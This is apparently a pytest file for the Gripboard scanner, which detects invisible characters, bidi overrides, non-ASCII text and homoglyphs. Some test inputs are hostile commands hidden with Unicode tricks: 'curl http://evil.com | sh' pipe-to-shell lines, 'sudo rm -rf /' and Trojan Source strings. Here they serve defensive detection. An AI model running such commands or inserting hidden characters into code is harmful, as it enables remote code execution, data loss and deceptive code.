"""Tests for the Gripboard scanner engine."""

from gripboard.scanner import (
    Scanner,
    Severity,
    check_bidi,
    check_homoglyphs,
    check_invisible,
    check_non_ascii,
)


class TestCheckInvisible:
    def test_clean_text(self):
        assert check_invisible("echo hello world") == []

    def test_zero_width_space(self):
        text = "sudo\u200Brm -rf /"
        findings = check_invisible(text)
        assert len(findings) == 1
        assert findings[0].codepoint == "U+200B"
        assert findings[0].rule == "invisible-char"
        assert findings[0].severity == Severity.HIGH

    def test_multiple_invisible(self):
        text = "curl\u200B\u200C\u200D http://evil.com | sh"
        findings = check_invisible(text)
        assert len(findings) == 3

    def test_bom(self):
        text = "\uFEFFimport os"
        findings = check_invisible(text)
        assert len(findings) == 1
        assert "BOM" in findings[0].description

    def test_soft_hyphen(self):
        text = "pass\u00ADword"
        findings = check_invisible(text)
        assert len(findings) == 1
        assert findings[0].codepoint == "U+00AD"


class TestCheckBidi:
    def test_clean_text(self):
        assert check_bidi("normal english text") == []

    def test_rlo_attack(self):
        # Right-to-Left Override — classic Trojan Source
        text = "access_level = \u202E'user' != 'admin'"
        findings = check_bidi(text)
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL
        assert findings[0].codepoint == "U+202E"

    def test_rli_lri(self):
        text = "\u2067admin\u2069"
        findings = check_bidi(text)
        assert len(findings) == 2

    def test_multiple_bidi(self):
        text = "\u202Ahello\u202B\u202Cworld\u202D\u202E"
        findings = check_bidi(text)
        assert len(findings) == 5


class TestCheckNonAscii:
    def test_clean_ascii(self):
        assert check_non_ascii("ls -la /tmp && echo done") == []

    def test_allows_whitespace(self):
        assert check_non_ascii("line1\nline2\ttabbed\r\n") == []

    def test_flags_accented(self):
        findings = check_non_ascii("café")
        assert len(findings) == 1
        assert findings[0].codepoint == "U+00E9"

    def test_flags_emoji(self):
        findings = check_non_ascii("hello \U0001F600")
        assert len(findings) == 1

    def test_flags_cjk(self):
        findings = check_non_ascii("test \u4e2d\u6587")
        assert len(findings) == 2


class TestCheckHomoglyphs:
    def test_clean_ascii(self):
        assert check_homoglyphs("echo HELLO") == []

    def test_cyrillic_a(self):
        # Cyrillic а (U+0430) looks like Latin a
        text = "\u0430dmin"
        findings = check_homoglyphs(text)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "'a'" in findings[0].description

    def test_cyrillic_mixed(self):
        # "sudo" with Cyrillic с and о
        text = "\u0441udo rm -rf \u043E"
        findings = check_homoglyphs(text)
        assert len(findings) == 2

    def test_greek_lookalikes(self):
        # Greek Ο (U+039F) looks like Latin O
        text = "\u039Fpen"
        findings = check_homoglyphs(text)
        assert len(findings) == 1
        assert "'O'" in findings[0].description

    def test_smart_quotes(self):
        text = "\u201Chello\u201D"
        findings = check_homoglyphs(text)
        assert len(findings) == 2

    def test_en_dash(self):
        text = "curl \u2013verbose"
        findings = check_homoglyphs(text)
        assert len(findings) == 1
        assert "'-'" in findings[0].description


class TestScanner:
    def test_clean_scan(self):
        scanner = Scanner()
        result = scanner.scan("echo hello world")
        assert result.is_clean
        assert result.severity == Severity.SAFE

    def test_mixed_threats(self):
        # Invisible + homoglyph
        scanner = Scanner()
        text = "\u200B\u0430dmin"  # ZWS + cyrillic a
        result = scanner.scan(text)
        assert not result.is_clean
        assert result.severity == Severity.HIGH
        assert len(result.findings) == 2

    def test_critical_bidi(self):
        scanner = Scanner()
        text = "if access_level != \u202E'user'"
        result = scanner.scan(text)
        assert result.severity == Severity.CRITICAL

    def test_allowlist(self):
        scanner = Scanner(allowed_codepoints={0x00E9})  # allow é
        result = scanner.scan("café")
        assert result.is_clean

    def test_disable_checks(self):
        scanner = Scanner(check_ascii=False, check_homoglyph=False)
        text = "\u0430dmin"  # cyrillic a — only caught by homoglyph + non-ascii
        result = scanner.scan(text)
        assert result.is_clean

    def test_deduplication(self):
        # A homoglyph is also non-ASCII; should only appear once (higher severity)
        scanner = Scanner()
        text = "\u0430"  # cyrillic a — matches homoglyph (HIGH) and non-ascii (LOW)
        result = scanner.scan(text)
        assert len(result.findings) == 1
        assert result.findings[0].rule == "homoglyph"  # higher severity kept

    def test_real_world_attack_curl_pipe(self):
        """Simulate a real-world attack: curl with invisible chars."""
        scanner = Scanner()
        text = "curl\u200B https://evil\u200B.com | sh"
        result = scanner.scan(text)
        assert not result.is_clean
        assert result.severity == Severity.HIGH

    def test_real_world_trojan_source(self):
        """Simulate a Trojan Source attack with RLO."""
        scanner = Scanner()
        text = 'access_level = "user\u202E\u2066" != "admin"'
        result = scanner.scan(text)
        assert result.severity == Severity.CRITICAL
